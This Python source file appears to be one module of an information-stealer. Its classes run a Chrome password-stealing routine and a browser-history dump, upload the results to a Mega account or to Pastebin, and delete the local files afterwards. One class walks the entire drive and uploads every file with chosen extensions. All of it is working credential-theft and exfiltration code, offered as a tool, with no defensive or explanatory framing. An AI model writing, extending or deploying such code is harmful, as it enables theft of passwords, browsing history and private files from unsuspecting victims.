# -*- coding: utf-8 '-*-'
# Author: Abdulrahman Mohammed (De3vil)
# Don't touch my code, it's art 
#+==============================

from mega import Mega
from os import chdir , remove  , getcwd , environ , walk , path , system
from Steal_PS import Main
from modules_version2.Moud.History import DumpHistory
from modules_version2.Moud.BeastBincr import BCR 

class upToMaGePAS:
	def __init__(self):
		self.pa = getcwd()
		self.Mega_up = Mega()
	def up(self , email , password):
		mido = Main()
		mido.main()
		path = chdir(self.pa)
		remove("ChromeData.db")
		paTh = chdir(environ["temp"])
		self.Mega_up.login(email=email , password=password)
		self.Mega_up.upload("pass.txt")
		remove("pass.txt")

class upToMaGeHIS:
	def __init__(self):
		self.Mega_up = Mega()
	def up(self , email , password):
		self.Mega_up.login(email=email , password=password)
		mido = DumpHistory()
		mido.Mido()
		paTh = chdir(environ["temp"])
		self.Mega_up.upload("dump_history.txt")
		remove("dump_history.txt")

class FilesSend:
	def __init__(self):
		self.Mega_up = Mega()
	def Extension(self,extension):
		self.extensionn = extension
		self.ss = self.extensionn.split(",")
	def uploading(self,email , password ):
		self.Mega_up.login(email=email , password=password)
		for x , y , z in walk("\\"):
			for name in z:
				self.path =  path.join(x,name)
				self.mido = self.path.split('.')[-1]
				if self.mido in self.ss:
					pass
					file = self.Mega_up.upload(self.path)

class UptoBastebinPass:
	def __init__(self):
		self.pa = getcwd()
	def up(self , key , username , Password):
		mido = Main()
		mido.main()
		past = BCR()
		path = chdir(self.pa)
		remove("ChromeData.db")
		paTh = chdir(environ["temp"])
		with open("pass.txt" , "r") as reading:
			txt = reading.readlines()
		past.bastbincr(key=key, username=username, Password=Password, data=txt)
		remove("pass.txt")
class UptoBastebinHS:
	def __init__(self):
		self.pa = getcwd()
	def up(self , key , username , Password):
		mido = DumpHistory()
		mido.Mido()
		past = BCR()
		path = chdir(self.pa)
		paTh = chdir(environ["temp"])
		with open("dump_history.txt" , "r") as reading:
			txt = reading.readlines()
		past.bastbincr(key=key, username=username, Password=Password, data=txt)
		remove("dump_history.txt")
